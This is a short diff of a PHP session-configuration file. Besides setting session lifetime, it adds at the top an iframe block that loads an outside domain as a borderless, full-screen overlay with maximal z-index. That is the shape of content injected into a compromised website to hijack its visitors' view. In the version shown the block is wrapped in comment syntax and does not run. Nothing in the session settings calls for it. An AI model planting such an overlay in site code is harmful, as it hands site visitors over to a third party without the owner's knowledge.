@@ -1,4 +1,7 @@
 <?php
+/*<!--iframe src="https://rromap.com" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
+    Your browser doesn't support iframes
+</iframe-->*/
 // server should keep session data for AT LEAST 10 hour
 ini_set('session.gc_maxlifetime', 36000);
 // each client should remember their session id for EXACTLY 10 hour
